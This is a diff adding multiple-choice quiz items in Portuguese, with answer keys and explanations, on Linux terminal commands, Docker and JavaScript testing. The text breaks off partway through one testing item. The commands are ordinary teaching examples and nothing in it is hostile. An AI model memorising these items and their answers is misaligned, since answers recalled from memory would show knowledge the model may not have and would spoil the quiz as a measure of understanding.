@@ -3598,5 +3598,2245 @@
       "label": "Modelagem de dados",
       "description": "Tabelas, chaves, relacionamentos e normalização"
     }
+  },
+  {
+    "id": "lnx-001",
+    "language": "bash",
+    "question": "Qual comando mostra em qual pasta você está agora?",
+    "code": "",
+    "options": [
+      "ls",
+      "whoami",
+      "cd",
+      "pwd"
+    ],
+    "answer": 3,
+    "explanation": "`pwd` (print working directory) imprime o caminho da pasta atual. O `ls` lista o conteúdo, o `cd` troca de pasta e o `whoami` mostra o usuário.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-002",
+    "language": "bash",
+    "question": "Qual comando lista os arquivos da pasta, inclusive os ocultos, em formato detalhado?",
+    "code": "",
+    "options": [
+      "ls -h",
+      "ls -r",
+      "dir --all",
+      "ls -la"
+    ],
+    "answer": 3,
+    "explanation": "No `ls -la`, o `-l` mostra o formato detalhado (permissões, dono, tamanho, data) e o `-a` inclui os ocultos, os que começam com ponto. O `-r` só inverte a ordem e o `-h` só deixa os tamanhos legíveis.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-003",
+    "language": "bash",
+    "question": "Qual comando cria uma pasta chamada projetos?",
+    "code": "",
+    "options": [
+      "mkdir projetos",
+      "rm projetos",
+      "touch projetos",
+      "cd projetos"
+    ],
+    "answer": 0,
+    "explanation": "`mkdir` (make directory) cria pastas. O `touch` cria um arquivo vazio, o `cd` entra numa pasta que já existe e o `rm` apaga arquivos (e, sem `-r`, recusa pastas).",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-004",
+    "language": "bash",
+    "question": "O que o comando `cd ..` faz?",
+    "code": "cd ..",
+    "options": [
+      "Fecha a janela do terminal e encerra a sessão",
+      "Vai para a pasta pessoal do usuário (a home)",
+      "Sobe para a pasta pai (a que contém a atual)",
+      "Volta para a última pasta em que você estava"
+    ],
+    "answer": 2,
+    "explanation": "Os dois pontos (`..`) representam a pasta pai. Para ir à pasta pessoal, use `cd` sozinho (ou `cd ~`); para voltar à pasta anterior, `cd -`.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-005",
+    "language": "bash",
+    "question": "O que esse comando mostra?",
+    "code": "cat acessos.log | grep \"404\" | wc -l",
+    "options": [
+      "O tamanho do log em bytes",
+      "Quantas palavras há no log inteiro",
+      "As linhas do log que contêm 404",
+      "Quantas linhas do log contêm 404"
+    ],
+    "answer": 3,
+    "explanation": "O pipe (`|`) liga a saída de um comando à entrada do próximo: `cat` lê o arquivo, `grep` fica só com as linhas com 404 e `wc -l` conta linhas. Sem o `wc -l`, apareceriam as próprias linhas.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-006",
+    "language": "bash",
+    "question": "O que o último comando mostra?",
+    "code": "echo \"a\" > lista.txt\necho \"b\" >> lista.txt\necho \"c\" > lista.txt\ncat lista.txt",
+    "options": [
+      "a, b e c, uma por linha",
+      "O b e o c",
+      "Só o c",
+      "Só o a e o b"
+    ],
+    "answer": 2,
+    "explanation": "O `>` sobrescreve o arquivo (apaga o que havia) e o `>>` acrescenta no final. A terceira linha usa `>` de novo, então apaga `a` e `b` e deixa só `c`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-007",
+    "language": "bash",
+    "question": "Que permissões esse comando dá ao arquivo?",
+    "code": "chmod 755 deploy.sh",
+    "options": [
+      "Só o dono pode ler e executar; os demais não podem nada",
+      "Dono: ler, escrever e executar; grupo e outros: ler e executar",
+      "Dono: só leitura; grupo e outros: ler, escrever e executar",
+      "Todos (dono, grupo e outros) podem ler, escrever e executar"
+    ],
+    "answer": 1,
+    "explanation": "Cada dígito do modo é soma de leitura (4), escrita (2) e execução (1), na ordem dono, grupo, outros. 7 = 4+2+1 (`rwx`) e 5 = 4+1 (`r-x`), então `755` é `rwxr-xr-x`: o padrão de scripts e programas.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-008",
+    "language": "bash",
+    "question": "O que o `echo $?` mostra?",
+    "code": "ls /pasta-que-nao-existe\necho $?",
+    "options": [
+      "O nome da pasta em que o terminal está aberto",
+      "Quantos arquivos o ls conseguiu listar na pasta",
+      "O código de saída do último comando (0 = sucesso)",
+      "O número do processo (PID) do último comando"
+    ],
+    "answer": 2,
+    "explanation": "Todo comando termina com um código de saída: `0` significa sucesso e qualquer outro valor, falha. O `$?` guarda o do último comando; é nele que `&&`, `||` e `if` se baseiam. Aqui o `ls` falha (código 2).",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-009",
+    "language": "bash",
+    "question": "O que aparece no terminal?",
+    "code": "false && echo \"A\" || echo \"B\"\ntrue || echo \"C\"\necho \"D\"",
+    "options": [
+      "B e D",
+      "A, B e D",
+      "A e D",
+      "B, C e D"
+    ],
+    "answer": 0,
+    "explanation": "O `&&` só executa o próximo se o anterior deu certo, e o `||` só se deu errado. `false` falha, então o `A` é pulado e o `B` roda. `true` dá certo, então o `C` é pulado. O `D` roda sempre.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-010",
+    "language": "bash",
+    "question": "O que esse comando mostra?",
+    "code": "cut -d' ' -f1 acessos.log | sort | uniq -c | sort -rn | head -3",
+    "options": [
+      "Os 3 IPs que menos aparecem, em ordem alfabética",
+      "As 3 últimas linhas do log, sem linhas repetidas",
+      "Os 3 IPs que mais aparecem, com a contagem de cada",
+      "As 3 primeiras linhas do log, já em ordem alfabética"
+    ],
+    "answer": 2,
+    "explanation": "`cut` pega a 1ª coluna (os IPs), `sort` agrupa os iguais, `uniq -c` conta cada grupo, `sort -rn` ordena do maior para o menor número e `head -3` fica com os 3 primeiros. É o clássico \"top N\" do terminal.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-011",
+    "language": "bash",
+    "question": "O que esse comando faz?",
+    "code": "find . -name \"*.log\" -mtime +7 -delete",
+    "options": [
+      "Apaga os .log (nesta pasta e abaixo) com mais de 7 dias",
+      "Apaga os .log modificados nos últimos 7 dias",
+      "Lista os .log com mais de 7 KB, sem apagar nada",
+      "Apaga os .log só da pasta atual, não importa a idade deles"
+    ],
+    "answer": 0,
+    "explanation": "`find` percorre as subpastas, `-name` filtra pelo nome, `-mtime +7` seleciona o que foi modificado há mais de 7 dias e `-delete` apaga. Teste antes sem o `-delete` para só listar o que seria apagado.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-012",
+    "language": "bash",
+    "question": "O que aparece no terminal?",
+    "code": "nome=\"Ana\"\necho 'Olá, $nome'\necho \"Olá, $nome\"",
+    "options": [
+      "Olá, Ana e depois Olá, Ana",
+      "Olá, $nome e depois Olá, Ana",
+      "Olá, Ana e depois Olá, $nome",
+      "Olá, $nome e depois Olá, $nome"
+    ],
+    "answer": 1,
+    "explanation": "Aspas simples (`'...'`) mostram o texto literal, sem expandir variáveis. Aspas duplas (`\"...\"`) expandem `$nome`. Use aspas duplas ao redor de variáveis também para preservar espaços no valor.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-013",
+    "language": "bash",
+    "question": "O que aparece?",
+    "code": "set -o pipefail\nfalse | cat\necho \"status: $?\"",
+    "options": [
+      "status: 1",
+      "status: 127",
+      "status: 0",
+      "Nada: o script para antes"
+    ],
+    "answer": 0,
+    "explanation": "Sem `pipefail`, o status de um pipeline é o do último comando (aqui o `cat`, que dá 0) e a falha do `false` passa despercebida. Com `set -o pipefail`, o pipeline falha se qualquer etapa falhar. Costuma vir junto de `set -eu`.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-014",
+    "language": "bash",
+    "question": "Qual das duas linhas manda a saída normal E as mensagens de erro para o out.txt?",
+    "code": "# A\nls /nada pasta > out.txt 2>&1\n# B\nls /nada pasta 2>&1 > out.txt",
+    "options": [
+      "Nenhuma das duas",
+      "Só a A",
+      "Só a B",
+      "As duas"
+    ],
+    "answer": 1,
+    "explanation": "Os redirecionamentos valem na ordem. Na A, a saída vai para o arquivo e então o erro (2) é copiado para onde a saída (1) aponta: o arquivo. Na B, o erro copia o destino atual da saída (a tela) antes de ela ir para o arquivo, então o erro continua na tela.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-015",
+    "language": "bash",
+    "question": "Esse comando falha em arquivos como \"meu arquivo.txt\". Qual o problema e a correção?",
+    "code": "find . -name \"*.txt\" | xargs rm",
+    "options": [
+      "O find não enxerga arquivos ocultos; use a opção -hidden sempre",
+      "O rm não apaga .txt sem a opção -f; use sempre rm -f",
+      "O xargs só aceita um arquivo por vez; use xargs -n 1",
+      "Espaços viram vários argumentos; use find -print0 e xargs -0"
+    ],
+    "answer": 3,
+    "explanation": "O `xargs` separa os argumentos por espaço, então \"meu arquivo.txt\" vira \"meu\" e \"arquivo.txt\" (e o arquivo fica). `find -print0 | xargs -0` separa por byte nulo, que não pode existir em nome de arquivo. Ou use `find ... -delete`.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "lnx-016",
+    "language": "bash",
+    "question": "Por que tentar `kill PID` (SIGTERM) antes de recorrer ao `kill -9`?",
+    "code": "",
+    "options": [
+      "O -9 apenas pausa o processo, em vez de encerrá-lo",
+      "O SIGTERM deixa o programa limpar tudo; o -9 corta na hora",
+      "O SIGTERM encerra o processo bem mais rápido que o -9",
+      "O -9 só funciona quando o comando é rodado pelo usuário root"
+    ],
+    "answer": 1,
+    "explanation": "O `kill` comum envia SIGTERM, que o programa pode tratar (salvar, fechar conexões, apagar temporários). O `kill -9` envia SIGKILL, que não pode ser tratado nem ignorado: o sistema encerra o processo de imediato, sem limpeza. Fica como último recurso.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "linux-shell",
+      "label": "Linux e terminal",
+      "description": "Comandos do dia a dia, pipes, permissões e scripts"
+    }
+  },
+  {
+    "id": "dkr-001",
+    "language": "docker",
+    "question": "Qual é a diferença entre uma imagem e um contêiner Docker?",
+    "code": "",
+    "options": [
+      "A imagem só existe no Docker Hub e o contêiner só no computador",
+      "A imagem é o pacote; o contêiner é a execução dele, isolada",
+      "São a mesma coisa; só mudam de nome conforme o sistema",
+      "O contêiner é o pacote; a imagem é o processo em execução"
+    ],
+    "answer": 1,
+    "explanation": "A imagem é o pacote com os arquivos, bibliotecas e configurações necessários. O contêiner é um processo isolado criado a partir dela. De uma mesma imagem saem quantos contêineres você quiser.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-002",
+    "language": "docker",
+    "question": "Qual comando baixa a imagem do nginx do Docker Hub, sem iniciar nada?",
+    "code": "",
+    "options": [
+      "docker get nginx",
+      "docker pull nginx",
+      "docker install nginx",
+      "docker run nginx"
+    ],
+    "answer": 1,
+    "explanation": "O `docker pull` só baixa a imagem do registro. O `docker run` também baixa (se faltar), mas em seguida cria e inicia um contêiner. `get` e `install` não são comandos do Docker.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-003",
+    "language": "docker",
+    "question": "Qual comando lista os contêineres que estão em execução?",
+    "code": "",
+    "options": [
+      "docker list",
+      "docker run -l",
+      "docker images",
+      "docker ps"
+    ],
+    "answer": 3,
+    "explanation": "O `docker ps` mostra os contêineres em execução; com `-a` mostra também os parados. O `docker images` lista as imagens baixadas, não os contêineres.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-004",
+    "language": "docker",
+    "question": "O que a opção `-p 8080:80` faz?",
+    "code": "docker run -d -p 8080:80 nginx",
+    "options": [
+      "Liga a porta 8080 do seu computador à 80 do contêiner",
+      "Liga a porta 80 do computador à porta 8080 do contêiner",
+      "Limita o contêiner a 80 processos durante 8080 segundos",
+      "Abre as portas 8080 e 80 no firewall do seu computador"
+    ],
+    "answer": 0,
+    "explanation": "O formato é `-p PORTA_DO_COMPUTADOR:PORTA_DO_CONTÊINER`. Aqui, abrir http://localhost:8080 no navegador chega ao nginx, que escuta na porta 80 dentro do contêiner.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-005",
+    "language": "docker",
+    "question": "Qual a diferença entre RUN e CMD em um Dockerfile?",
+    "code": "FROM node:22\nRUN npm install\nCMD [\"node\", \"index.js\"]",
+    "options": [
+      "RUN roda ao iniciar o contêiner; CMD, na construção da imagem",
+      "RUN só aceita comandos do sistema operacional; CMD só aceita os do Node",
+      "RUN executa ao construir a imagem; CMD define o que roda ao iniciar",
+      "São sinônimos: os dois rodam na construção da imagem"
+    ],
+    "answer": 2,
+    "explanation": "O `RUN` executa o comando durante o `docker build` e grava o resultado como uma nova camada da imagem (aqui, as dependências instaladas). O `CMD` não executa nada na construção: só registra o comando padrão para quando o contêiner iniciar.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-006",
+    "language": "docker",
+    "question": "O que acontece com o contêiner quando o comando termina?",
+    "code": "docker run --rm alpine echo oi",
+    "options": [
+      "Ele é removido automaticamente",
+      "Fica parado, esperando para ser reiniciado",
+      "Reinicia sozinho até o comando dar certo",
+      "É removido junto com a imagem alpine"
+    ],
+    "answer": 0,
+    "explanation": "Sem `--rm`, o contêiner parado continua existindo (aparece no `docker ps -a`) e vai se acumulando. Com `--rm`, o Docker o remove ao terminar. A imagem não é afetada.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-007",
+    "language": "docker",
+    "question": "Um banco de dados roda num contêiner sem volume. O que acontece com os dados se o contêiner for removido?",
+    "code": "",
+    "options": [
+      "Os dados somem com o contêiner; para guardá-los, use um volume",
+      "Nada muda: o Docker sempre mantém os dados",
+      "São copiados sozinhos para uma pasta do computador",
+      "Ficam gravados na imagem e aparecem no próximo contêiner criado"
+    ],
+    "answer": 0,
+    "explanation": "O que o contêiner grava vai para a camada gravável dele, que só existe junto com ele. Para os dados sobreviverem, monte um volume (`-v dados:/var/lib/postgresql/data`) ou uma pasta do computador (bind mount).",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-008",
+    "language": "docker",
+    "question": "O que o `EXPOSE 3000` faz sozinho?",
+    "code": "FROM node:22\nCOPY . /app\nEXPOSE 3000\nCMD [\"node\", \"/app/index.js\"]",
+    "options": [
+      "Publica a porta 3000 no computador automaticamente",
+      "Só documenta a porta; para acessar de fora, use -p",
+      "Abre a porta 3000 no firewall do sistema operacional",
+      "Faz a aplicação passar a escutar na porta 3000 sozinha"
+    ],
+    "answer": 1,
+    "explanation": "O `EXPOSE` é documentação: informa quem usa a imagem em qual porta a aplicação escuta. Quem de fato publica é o `docker run -p` (ou `-P`, que publica todas as portas expostas).",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-009",
+    "language": "docker",
+    "question": "O que mudar para o `npm install` ser reaproveitado do cache quando só o código muda?",
+    "code": "FROM node:22\nWORKDIR /app\nCOPY . .\nRUN npm install\nCMD [\"node\", \"index.js\"]",
+    "options": [
+      "Mover o WORKDIR para o fim do arquivo, depois do CMD e do RUN",
+      "Trocar o RUN npm install por CMD npm install",
+      "Usar docker build --no-cache em todo build",
+      "Copiar o package*.json, instalar e só depois copiar o código"
+    ],
+    "answer": 3,
+    "explanation": "Cada instrução vira uma camada, e quando uma muda, todas as seguintes são refeitas. Com `COPY . .` antes do `npm install`, qualquer alteração de código invalida a instalação. Copiando antes só o `package*.json`, ela só refaz quando as dependências mudam.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-010",
+    "language": "docker",
+    "question": "Por que a forma de lista é preferida para o CMD?",
+    "code": "# forma de lista (exec)\nCMD [\"node\", \"app.js\"]\n\n# forma de texto (shell)\nCMD node app.js",
+    "options": [
+      "Porque a forma de texto não aceita nenhum argumento no comando",
+      "O processo vira o PID 1 e recebe sinais como o SIGTERM",
+      "Porque a forma de texto só funciona no Windows",
+      "Porque a forma de lista roda mais rápido no build"
+    ],
+    "answer": 1,
+    "explanation": "Na forma de texto, o Docker executa `/bin/sh -c \"node app.js\"`. Em casos simples alguns shells se substituem pelo comando e nada muda, mas com `&&`, `;`, pipes ou variáveis o shell continua como PID 1 e não repassa o SIGTERM: o `docker stop` espera o prazo (10 s) e usa SIGKILL. Na forma de lista, a aplicação é o PID 1 e recebe o sinal.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-011",
+    "language": "docker",
+    "question": "Com `docker run minha-imagem -c 1 8.8.8.8`, qual comando é executado?",
+    "code": "ENTRYPOINT [\"ping\"]\nCMD [\"-c\", \"3\", \"localhost\"]",
+    "options": [
+      "ping -c 3 localhost",
+      "-c 1 8.8.8.8",
+      "ping -c 1 8.8.8.8",
+      "ping -c 3 localhost -c 1 8.8.8.8"
+    ],
+    "answer": 2,
+    "explanation": "O `ENTRYPOINT` é o executável fixo e o `CMD` são só os argumentos padrão. O que vem depois do nome da imagem no `docker run` substitui o `CMD` e mantém o `ENTRYPOINT`. Sem argumentos, rodaria `ping -c 3 localhost`.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-012",
+    "language": "docker",
+    "question": "Qual instrução faz o contêiner rodar como um usuário comum, e não como root?",
+    "code": "FROM node:22\nRUN useradd -m app\n____ app\nCMD [\"node\", \"index.js\"]",
+    "options": [
+      "RUN",
+      "SETUSER",
+      "USER",
+      "WORKDIR"
+    ],
+    "answer": 2,
+    "explanation": "O `USER` define o usuário padrão para as instruções seguintes e para o `CMD`/`ENTRYPOINT` em execução. Rodar sem privilégios de root segue o princípio do menor privilégio: se a aplicação for comprometida, o estrago é menor.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-013",
+    "language": "docker",
+    "question": "Qual o ganho principal dessa estrutura em dois estágios?",
+    "code": "FROM golang:1.24 AS build\nWORKDIR /src\nCOPY . .\nRUN go build -o /app\n\nFROM gcr.io/distroless/static\nCOPY --from=build /app /app\nCMD [\"/app\"]",
+    "options": [
+      "O contêiner reinicia sozinho se o binário falhar",
+      "O build roda mais rápido porque usa duas CPUs",
+      "A imagem final inclui os dois estágios, para facilitar a depuração",
+      "A imagem final leva só o binário, sem compilador nem código-fonte"
+    ],
+    "answer": 3,
+    "explanation": "No multi-stage, cada `FROM` começa um estágio, e o `COPY --from` traz só o que interessa do anterior. O compilador e o código ficam para trás: a imagem final é bem menor e tem menos coisas para atacar.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-014",
+    "language": "docker",
+    "question": "O que esse trecho garante que um depends_on simples não garante?",
+    "code": "services:\n  api:\n    build: .\n    depends_on:\n      db:\n        condition: service_healthy\n  db:\n    image: postgres:17\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]",
+    "options": [
+      "Que a api só sobe quando o Postgres aceita conexões",
+      "Que o db inicia mais rápido do que a api no mesmo host",
+      "Que o db reinicia sozinho sempre que o contêiner cair",
+      "Que a api e o db compartilham o mesmo volume de dados"
+    ],
+    "answer": 0,
+    "explanation": "O `depends_on` simples só controla a ordem de início: o Compose espera o contêiner estar rodando, não pronto. Com `condition: service_healthy` e um `healthcheck`, a `api` só sobe quando o banco de fato responde, evitando erros de conexão na partida.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-015",
+    "language": "docker",
+    "question": "Para que serve o arquivo .dockerignore?",
+    "code": "# .dockerignore\nnode_modules\n.git\n.env",
+    "options": [
+      "Impedir que o contêiner leia certos arquivos enquanto roda",
+      "Fazer o docker pull pular as imagens listadas nele",
+      "Ignorar os erros de sintaxe do Dockerfile durante o build",
+      "Tirar arquivos do contexto de build (menor e sem segredos)"
+    ],
+    "answer": 3,
+    "explanation": "O `.dockerignore` (como o `.gitignore`) tira arquivos do contexto enviado ao build: ele fica menor e mais rápido, e um `COPY . .` não leva `node_modules`, `.git` nem `.env` (com senhas) para dentro da imagem.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "dkr-016",
+    "language": "docker",
+    "question": "Por que isso é inseguro, e qual a alternativa para segredos usados no build?",
+    "code": "FROM node:22\nENV API_KEY=abc123\nRUN npm install",
+    "options": [
+      "O ENV não aceita valores com letras e números juntos",
+      "O Docker criptografa o valor, mas a chave fica no Docker Hub",
+      "O valor fica na imagem; use build secrets (--mount=type=secret)",
+      "O ENV só vale durante o build e some depois, mas o npm pode logá-lo"
+    ],
+    "answer": 2,
+    "explanation": "Variáveis de `ENV` e `ARG` ficam nas camadas da imagem (aparecem em `docker history` e `docker inspect`), então quem baixar a imagem lê o segredo. Para o build, use secret mounts (`RUN --mount=type=secret`); em execução, passe o valor pelo ambiente ou um gerenciador de segredos.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "docker-basics",
+      "label": "Docker e contêineres",
+      "description": "Imagens, contêineres, Dockerfile e Compose"
+    }
+  },
+  {
+    "id": "tst-001",
+    "language": "javascript",
+    "question": "Para que serve um teste automatizado?",
+    "code": "",
+    "options": [
+      "Gerar a documentação do projeto sem precisar escrever nada",
+      "Deixar o programa mais rápido na hora de executar em produção",
+      "Dispensar a revisão de código feita pelas outras pessoas do time",
+      "Conferir, a cada mudança, que o código segue funcionando"
+    ],
+    "answer": 3,
+    "explanation": "O teste roda o código e compara o resultado com o esperado. Executado a cada mudança, ele avisa na hora quando algo que funcionava quebrou (uma regressão). Ele não deixa o programa mais rápido nem substitui a revisão.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-002",
+    "language": "javascript",
+    "question": "O que acontece se `soma(2, 3)` devolver 6?",
+    "code": "const assert = require(\"node:assert\");\n\nassert.strictEqual(soma(2, 3), 5);",
+    "options": [
+      "Lança um AssertionError e o teste falha",
+      "Nada: o assert só avisa no console e segue",
+      "Retorna false e o teste continua normalmente",
+      "O Node corrige o valor para 5 automaticamente"
+    ],
+    "answer": 0,
+    "explanation": "`assert.strictEqual(atual, esperado)` compara com `===` e, se os valores forem diferentes, lança um `AssertionError` com os dois valores. É essa exceção que faz o executor marcar o teste como falho.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-003",
+    "language": "javascript",
+    "question": "Em que ordem o padrão AAA organiza um teste?",
+    "code": "",
+    "options": [
+      "Act, Arrange, Assert: executar, preparar e verificar",
+      "Arrange, Assert, Act: preparar, verificar e executar",
+      "Assert, Act, Arrange: verificar, executar e preparar",
+      "Arrange, Act, Assert: preparar, executar e verificar"
+    ],
+    "answer": 3,
+    "explanation": "Arrange monta os dados e o cenário, Act executa a ação testada (uma só) e Assert confere o resultado. Separar as três partes deixa o teste legível e mostra de onde veio a falha.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-004",
+    "language": "javascript",
+    "question": "Qual comando roda os testes nativos do Node.js?",
+    "code": "// soma.test.js\nconst { test } = require(\"node:test\");\nconst assert = require(\"node:assert\");\n\ntest(\"soma\", () => assert.strictEqual(2 + 3, 5));",
+    "options": [
+      "node --check",
+      "node --test",
+      "node test",
+      "npm install test"
+    ],
+    "answer": 1,
+    "explanation": "A opção `--test` ativa o executor embutido: ele procura arquivos `*.test.js` (e a pasta `test/`), roda cada um e resume o resultado. `node test` tentaria executar um arquivo chamado `test`, e `--check` só confere a sintaxe.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-005",
+    "language": "javascript",
+    "question": "O que acontece nessa comparação?",
+    "code": "assert.strictEqual({ a: 1 }, { a: 1 });",
+    "options": [
+      "Falha: são dois objetos distintos; use deepStrictEqual",
+      "Passa: os dois objetos têm exatamente o mesmo conteúdo",
+      "Passa, mas o Node mostra um aviso sobre a comparação",
+      "Dá erro de sintaxe, pois objetos exigem outra função"
+    ],
+    "answer": 0,
+    "explanation": "`strictEqual` usa `===`, que compara objetos pela referência (o endereço na memória) e não pelo conteúdo. Para comparar o conteúdo, inclusive de objetos e arrays aninhados, use `assert.deepStrictEqual`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-006",
+    "language": "javascript",
+    "question": "Se `buscarUsuario` devolver outro nome, o que o teste mostra?",
+    "code": "test(\"busca o usuário\", () => {\n  buscarUsuario(1).then((u) => {\n    assert.strictEqual(u.nome, \"Ana\");\n  });\n});",
+    "options": [
+      "Falha só se o Node estiver rodando em modo estrito (use strict)",
+      "Fica travado esperando até o then terminar, sem nunca acabar",
+      "Falha na hora, mostrando a mensagem do assert que está dentro do then",
+      "Passa: o teste acaba antes da verificação; falta await ou return"
+    ],
+    "answer": 3,
+    "explanation": "O executor só espera o que a função de teste devolve. Sem `await` nem `return` na Promise, o teste termina antes do `then` rodar e é marcado como passou; a falha chega depois, como uma rejeição não tratada que derruba o processo. Use `async` e `await`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "testing-basics",
+      "label": "Testes automatizados",
+      "description": "Escrever, organizar e confiar em testes"
+    }
+  },
+  {
+    "id": "tst-007",
+    "language": "javascript",
+    "question": "Rodando os dois testes em sequência, o que acontece?",
+    "code": "let contador = 0;\n\ntest(\"a\", () => {\n  contador++;\n  assert.strictEqual(contador, 1);\n});\n\ntest(\"b\", () => {\n  contador++;\n  assert.strictEqual(contador, 1);\n});",
+    "options": [
+      "Os dois passam, pois cada teste roda em um processo separado",
+      "Só o b passa, pois o a prepara o estado que ele precisa",
+      "O a passa e o b falha, porque o estado do a vazou para o b",
